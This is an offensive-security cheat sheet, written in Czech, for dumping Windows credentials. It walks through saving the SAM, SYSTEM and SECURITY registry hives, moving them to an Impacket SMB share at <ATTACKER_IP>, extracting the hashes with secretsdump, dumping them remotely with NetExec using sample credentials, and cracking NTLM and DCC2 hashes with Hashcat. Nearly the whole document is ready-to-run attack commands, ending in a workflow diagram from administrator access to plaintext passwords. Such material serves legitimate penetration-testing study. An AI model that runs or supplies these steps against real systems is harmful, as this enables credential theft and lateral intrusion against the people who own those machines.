# 🔐 SAM, SYSTEM & SECURITY Dump Cheat Sheet

---

# 1. Registry Hives

Po získání administrátorských práv na Windows lze získat lokální heslové hashe pomocí registry hive souborů.

Potřebné soubory:

|Hive|Obsah|
|---|---|
|SAM|NTLM hashe lokálních uživatelů|
|SYSTEM|Boot Key potřebný k dešifrování SAM|
|SECURITY|LSA Secrets, cached credentials, DPAPI klíče|

---

# 2. Export Registry Hives

## Vytvoření záloh na cílovém systému

Spuštěno jako Administrator:

```cmd
reg.exe save hklm\sam C:\sam.save

reg.exe save hklm\system C:\system.save

reg.exe save hklm\security C:\security.save
```

---

# 3. Exfiltrace Hive souborů

## Impacket SMB Server

Na útočníkovi:

```bash
sudo impacket-smbserver CompData $(pwd) -smb2support
```

---

Na cílovém systému:

```cmd
move C:\sam.save \\<ATTACKER_IP>\CompData

move C:\system.save \\<ATTACKER_IP>\CompData

move C:\security.save \\<ATTACKER_IP>\CompData
```

---

# 4. Offline Dump Hashů

Po získání souborů:

```bash
impacket-secretsdump \
-sam sam.save \
-security security.save \
-system system.save \
LOCAL > hashes.txt
```

---

Výstup:

```text
username:RID:LMHASH:NTHASH
```

Zajímá tě hlavně:

```text
NTHASH
```

který lze crackovat pomocí Hashcatu.

---

# 5. Vzdálený Dump přes NetExec

Pokud máš administrátorské přihlašovací údaje, lze použít vzdálený dumping.

---

## SAM Hashes

```bash
netexec smb <IP> \
--local-auth \
-u bob \
-p 'Password123' \
--sam
```

---

## LSA Secrets

Obsahuje například:

- hesla služeb
    
- uložené přihlašovací údaje
    
- další tajné informace
    

```bash
netexec smb <IP> \
--local-auth \
-u bob \
-p 'Password123' \
--lsa
```

---

# 6. Crackování Hashů

## NTLM (Lokální uživatelé)

Hashcat mód:

```text
-m 1000
```

Příklad:

```bash
hashcat \
-m 1000 \
hashes.txt \
/usr/share/wordlists/rockyou.txt
```

---

## DCC2 Cached Domain Credentials

Formát:

```text
$DCC2$10240#username#hash
```

Hashcat mód:

```text
-m 2100
```

Příklad:

```bash
hashcat \
-m 2100 \
dcc2.hash \
/usr/share/wordlists/rockyou.txt
```

---

# ⚡ Rozdíl rychlosti

|Typ hashe|Hashcat mód|Rychlost|
|---|---|---|
|NTLM|1000|Velmi rychlé|
|DCC2|2100|Výrazně pomalejší|

DCC2 používá iterace pro zpomalení crackování.

---

# 🧰 Nástroje

|Nástroj|Použití|
|---|---|
|reg.exe|Export registry hive|
|Impacket secretsdump|Extrakce hashů|
|Impacket SMB Server|Přenos souborů|
|NetExec|Remote dumping|
|Hashcat|Crackování hashů|

---

# Attack Workflow

```text
Administrator Access
        |
        ▼
Export SAM/SYSTEM/SECURITY
        |
        ▼
Exfiltrace Hive Files
        |
        ▼
secretsdump
        |
        ▼
NTLM / DCC2 Hashes
        |
        ▼
Hashcat
        |
        ▼
Plaintext Password
```
